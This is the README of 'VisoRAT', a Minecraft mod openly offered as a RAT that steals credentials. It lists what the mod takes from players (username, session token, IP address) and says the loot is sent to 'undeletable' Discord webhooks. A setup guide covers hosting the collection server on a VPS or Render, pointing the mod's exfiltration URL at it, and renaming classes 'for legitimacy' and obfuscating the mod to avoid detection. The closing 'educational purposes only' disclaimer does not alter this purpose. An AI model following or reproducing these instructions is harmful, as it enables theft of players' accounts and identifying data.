# <img src="https://github.com/VisoXC/VisoRAT/blob/main/assets/rat.png?raw=true" width="32" height="32"> VisoRAT

![BigAhhRAT](https://github.com/VisoXC/VisoRAT/blob/main/assets/bigrat.png?raw=true)

> 🎯 *Since there are not enough RATs in the Minecraft community, here is another one!* 🙃
> 
> 👑 **Shout-out** to the [Ratter Scanner](https://ratterscanner.com/) team for being GOATed! 

---

## <img src="https://github.com/VisoXC/VisoRAT/blob/main/assets/table.png?raw=true" width="24" height="24"> Table of Contents
- [Features](#-features)
- [Screenshot](#-screenshot)
- [Setup Guide](#-setup-guide)
- [Server Settings](#-server-settings)
- [Support](#-support)
- [Disclaimer](#-disclaimer)

---

## <img src="https://github.com/VisoXC/VisoRAT/blob/main/assets/features.png?raw=true" width="24" height="24"> Features

### <img src="https://github.com/VisoXC/VisoRAT/blob/main/assets/server.png?raw=true" width="20" height="20"> Server Capabilities
- 🛡️ **Dedicated Server** with built-in security
- 🔗 **Undeletable Webhooks**
- 🚫 **Spam Protection**
- ✅ **Data Validation**
- 🔄 **Multi-RAT Support**
- 🎣 **D-Hookable Architecture**
- ⚙️ **Highly [Configurable](https://github.com/VisoXC/VisoRAT/blob/main/server/config.json)**
- 📝 **No Watermark**

### <img src="https://github.com/VisoXC/VisoRAT/blob/main/assets/data.png?raw=true" width="20" height="20"> Data Collection
- 👤 **Username**
- 🔑 **Session ID (Token)**
- 🌐 **IP Address**

### <img src="https://github.com/VisoXC/VisoRAT/blob/main/assets/performance.png?raw=true" width="20" height="20"> Performance
- ⚡ **Lightweight** design

---

## <img src="https://github.com/VisoXC/VisoRAT/blob/main/assets/screenshot.png?raw=true" width="24" height="24"> Screenshot

![Screenshot](https://github.com/VisoXC/VisoRAT/blob/main/assets/embed.png?raw=true)

---

## <img src="https://github.com/VisoXC/VisoRAT/blob/main/assets/setup.png?raw=true" width="24" height="24"> Setup Guide

### <img src="https://github.com/VisoXC/VisoRAT/blob/main/assets/server.png?raw=true" width="20" height="20"> Server Deployment

#### Option 1: VPS Hosting
1. 📥 **Download** the repository
2. 📁 Extract the `server` folder contents to your VPS
3. ⚙️ Edit `server/config.json` to your preferences
4. 🐍 Install Python/pip and requirements:
   ```bash
   pip install -r requirements.txt
   ```
5. 🚀 Run the server:
   ```bash
   python server.py
   ```

#### Option 2: Render Hosting 🌐
1. 🔒 **Private Fork** this repo (download & reupload privately)
2. ⚙️ Edit `server/config.json` to your preferences
3. 🔗 Create a Render account with your GitHub
4. 🆕 Create a **Web Service**
5. 📂 Select your forked repository
6. ⚙️ Configure:
   - **Branch**: `main`
   - **Root Directory**: `server`
   - **Runtime**: Python 3
   - **Build Command**: `pip install -r requirements.txt`
   - **Start Command**: `python server.py` or `python3 server.py`
7. ⏳ Wait for deployment

### <img src="https://github.com/VisoXC/VisoRAT/blob/main/assets/client.png?raw=true" width="20" height="20"> Mod/Client Setup

#### Option 1: Compile from Source
1. 📥 **Download** the repository
2. 🌐 Change Server IP in `src/main/java/me/visoxd/VisoMod.java`
3. 🎭 **Optional**: Rename classes/folders for legitimacy
4. 🔧 Compile with:
   - [JDK 21+](https://www.oracle.com/java/technologies/downloads/)
   
#### Option 2: Pre-built Release
1. 📦 Download from [Releases](https://github.com/VisoXC/VisoRAT/releases)
2. 🔧 Modify IP/URL using:
   - [Web-based Jar Editor](https://leonardosnt.github.io/jar-string-editor)
   - [Recaf](https://github.com/Col-E/Recaf/releases/tag/2.21.13)
   - *Search for: `"http://127.0.0.1:5000/receive"`*
3. 💾 Save and use the modified mod
4. 🔒 **Optional**: Obfuscate the mod

---

## <img src="https://github.com/VisoXC/VisoRAT/blob/main/assets/settings.png?raw=true" width="24" height="24"> Server Settings

The server configuration is stored in `server/config.json`. Below is a comprehensive table explaining all available settings:

### Configuration Reference

| Configuration Path | Type | Default | Description |
|-------------------|------|---------|-------------|
| **security.rate_limit_seconds** | Integer | 600 | Delay between requests an IP can send (in seconds) |
| **security.min_token_length** | Integer | 128 | Minimum required length for tokens |
| **security.check_duplicate_tokens** | Boolean | true | Blocks requests containing already seen tokens |
| **endpoints.{endpoint}.webhooks** | Array | - | Webhooks registered to the specified endpoint |
| **endpoints.{endpoint}.webhooks[].url** | String | - | Discord webhook URL (replace YOUR_DISCORD_WEBHOOK_URL_HERE) |
| **endpoints.{endpoint}.webhooks[].name** | String | - | Webhook display name in Discord |
| **endpoints.{endpoint}.webhooks[].footer** | String | "VisoRAT" | Footer text in the webhook embed |
| **endpoints.{endpoint}.webhooks[].color** | Integer | 7414964 | Color of the webhook embed (decimal format) |
| **endpoints.{endpoint}.webhooks[].avatar_url** | String | - | Direct link to image for webhook avatar |

**Note:** Replace `{endpoint}` with your actual endpoint names (e.g., `/receive`, `/auth`)

---

## <img src="https://github.com/VisoXC/VisoRAT/blob/main/assets/support.png?raw=true" width="24" height="24"> Support

If this project works for you, please **star** ⭐ this repository to show your support! ❤️

**I will be actively updating this repository and adding new features if it gets enough attention and stars!**

> 📚 *Credits to [Schubilegend](https://github.com/schubilegend) for the tutorial inspiration.*

---

## <img src="https://github.com/VisoXC/VisoRAT/blob/main/assets/disclaimer.png?raw=true" width="24" height="24"> DISCLAIMER

🚨 **WARNING**: I am **NOT** responsible for any damage caused by this program. This software is for **EDUCATIONAL PURPOSES ONLY**. Use at your own risk and always ensure you have proper authorization before deploying any security-related tools.
